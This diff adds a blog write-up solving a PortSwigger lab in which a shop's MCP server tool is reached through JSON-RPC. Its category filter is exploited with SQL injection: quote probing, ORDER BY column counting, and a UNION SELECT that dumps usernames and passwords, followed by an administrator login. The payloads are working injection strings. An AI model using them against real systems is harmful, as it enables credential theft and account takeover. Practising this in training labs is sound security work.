@@ -1,0 +1,231 @@
+---
+title: "SQL injection in an MCP server tool"
+description: "PortSwigger Web Security Academy lab — SQL injection in the category filter of an MCP server tool, reached through JSON-RPC."
+date: "2026-11-24"
+difficulty: "apprentice"
+published: true
+---
+
+# SQL injection in an MCP server tool
+
+[Lab link](https://portswigger.net/web-security/mcp)
+
+Prerequisite: Familiarity with `SQL injection > Union attacks`
+
+- [SQL injection](https://portswigger.net/web-security/sql-injection)
+- [Union attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
+
+---
+
+## What is an MCP
+
+The Model Context Protocol (MCP) is an open protocol that lets AI applications connect to external tools and data. Applications can expose functionality to AI assistants through an MCP server.
+
+## Getting started with the labs
+
+---
+
+## Lab: SQL injection in an MCP server tool
+
+This lab is a shop which has an MCP endpoint at `/mcp` and is vulnerable to SQL injection.
+
+We start by visiting the site and logging in with `wiener:peter`. Now there's no part of the front end that has an MCP button or whatever, so open Burp Suite, intercept a request and send it to your repeater.
+
+From the academy lesson, we already have an idea of what to do. Then change the path to `/mcp`, the method to `POST`, then add the header `Content-Type: application/json`.
+
+<div className="max-w-[720px] mx-auto">
+
+![Request changed to POST /mcp with a Content-Type header](/images/writeups/portswigger/mcp-empty-post.png)
+
+</div>
+
+Now when you send this request, as there's no body, you get a 400 Bad Request error.
+
+<div className="max-w-[720px] mx-auto">
+
+![400 Bad Request — Invalid JSON-RPC message](/images/writeups/portswigger/mcp-400-invalid-jsonrpc.png)
+
+</div>
+
+Now the body uses JSON-RPC, which is very similar to the usual JSON.
+
+In [How MCP servers work](https://portswigger.net/web-security/mcp#how-mcp-servers-work), there's an example of an MCP web request; what we need is the body:
+
+```json
+{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"get_product","arguments":{"productId":"1"}}}
+```
+
+We copy the body and paste it into ours and send the request. We get a response:
+
+```json
+{"jsonrpc":"2.0","id":3,"result":{"content":[{"type":"text","text":"{\n  \"id\": \"1\",\n  \"name\": \"Pest Control Umbrella\",\n  \"category\": \"Pets\",\n  \"price\": \"$7.39\",\n  \"rating\": 2,\n  \"description\": \"...\"\n}"}],"isError":false}}
+```
+
+On studying the JSON body, we see the method is `tools/call`, params takes `name` and arguments take the product ID. Let's play around with the body and see if there are other names, just to understand how it works.
+
+If we remove:
+
+```json
+,"params":{"name":"get_product","arguments":{"productId":"1"}}
+```
+
+from the previous, we get:
+
+```json
+{"jsonrpc":"2.0","id":3,"result":{"content":[{"type":"text","text":"productId is required"}],"isError":true}}
+```
+
+So if we had no idea what arguments are available, this has disclosed it to us.
+
+Let's see what other tools can be called. From [Testing MCP servers](https://portswigger.net/web-security/mcp#testing-mcp-servers), we were also hinted on how to go about that on the lab's homepage.
+
+We see various methods to see what a server offers:
+
+`tools/list`, `resources/list`, `resources/templates/list`, and `prompts/list`.
+
+On testing `tools/list`:
+
+```json
+{    "jsonrpc": "2.0",    "id": 3,    "method": "tools/list"}
+```
+
+we get the response:
+
+```json
+{"jsonrpc":"2.0","id":3,"result":{"tools":[{"name":"list_products","title":"List products","description":"Lists the products currently for sale. Optionally filter by category, for example \"Gifts\".","inputSchema":{"type":"object","properties":{"category":{"type":"string","description":"Only return products in this category"}},"required":[],"additionalProperties":false}},{"name":"get_product","title":"Get product","description":"Gets the details of a single product by its ID.","inputSchema":{"type":"object","properties":{"productId":{"type":"string","description":"The product ID"}},"required":["productId"],"additionalProperties":false}}]}}
+```
+
+Now we know the tool calls we can make are `list_products` and `get_product`. Let's see how `list_products` works:
+
+```json
+{    "jsonrpc": "2.0",    "id": 3,    "method": "tools/call",    "params": {        "name": "list_products"    }}
+```
+
+we get the response:
+
+```json
+{"jsonrpc":"2.0","id":3,"result":{"content":[{"type":"text","text":"[\n  {\n    \"id\": \"1\",\n    \"name\": \"Pest Control Umbrella\",\n    \"category\": \"Pets\", ...\n]"}]}}
+```
+
+Let's study the response. We notice there's a category filter. If you're familiar with PortSwigger labs (especially SQL injection labs), you have seen that on the front end. Let's add it as an argument and see what happens.
+
+The categories present are: Pets, Toys & Games, Lifestyle, Clothing, shoes and accessories, then Gifts.
+
+Let's set the category to Gifts and see the response:
+
+```json
+{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{
+       "name":"list_products",
+       "arguments":{"category":"Gifts"}
+     }}
+```
+
+```json
+{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"[\n  {\n    \"name\": \"High-End Gift Wrapping\", ...\n]"}]}}
+```
+
+Doing the same for Pets:
+
+```json
+{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{
+       "name":"list_products",
+       "arguments":{"category":"Pets"}
+     }}
+```
+
+```json
+{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"[\n  {\n    \"name\": \"Pest Control Umbrella\", ...\n]"}]}}
+```
+
+We can observe they both return different results, which tells us the category filter works.
+
+NOTE: The category filter is case sensitive, so sending `pets` instead of `Pets` will result in an empty result like so:
+
+```json
+{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"[]"}],"isError":false}}
+```
+
+Onto the SQL injection part. From PortSwigger's SQL injection labs, the vulnerability has always been the category filter, so let's test.
+
+We start by adding a `'` after our category:
+
+```json
+{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{
+       "name":"list_products",
+       "arguments":{"category":"Pets'"}
+     }}
+```
+
+It responds with Failed to list products:
+
+```json
+{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"Failed to list products"}],"isError":true}}
+```
+
+Now let's try using `ORDER BY` to determine the number of columns present:
+
+```json
+{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{
+       "name":"list_products",
+       "arguments":{"category":"Pets' ORDER BY 1--"}
+     }}
+```
+
+We get a successful response.
+
+We increase the number to 2, like `ORDER BY 1,2`, and we still get a successful response.
+
+On 3, we get `isError` as true, which tells us there are just 2 columns and it is vulnerable to SQL injection:
+
+```json
+{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{
+       "name":"list_products",
+       "arguments":{"category":"Pets' ORDER BY 1,2,3--"}
+     }}
+```
+
+```json
+{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"Failed to list products"}],"isError":true}}
+```
+
+Now I make use of a UNION attack, knowing I have just 2 columns:
+
+```json
+{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{
+       "name":"list_products",
+       "arguments":{"category":"Pets' UNION SELECT NULL,NULL--"}
+     }}
+```
+
+2 NULLs were successful, but a third will fail.
+
+Now we can go down the rabbit hole of identifying the database type, enumerating the tables, then columns, but I'm just going to skip all that, assuming the table for the credentials list is `USERS` and its columns are `USERNAME` and `PASSWORD`, from previous SQL labs:
+
+```json
+{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{
+       "name":"list_products",
+       "arguments":{"category":"Gifts' UNION SELECT username, password from users--"}
+     }}
+```
+
+<div className="max-w-[720px] mx-auto">
+
+![Burp response containing the administrator record](/images/writeups/portswigger/mcp-union-admin.png)
+
+</div>
+
+Now when we search `administrator` in the response, we see we've retrieved the login data from the database table.
+
+<div className="max-w-[420px] mx-auto">
+
+![Logging in as administrator](/images/writeups/portswigger/mcp-admin-login.png)
+
+</div>
+
+<div className="max-w-[420px] mx-auto">
+
+![Congratulations, you solved the lab!](/images/writeups/portswigger/mcp-solved.png)
+
+</div>
+
+Thanks for reading.
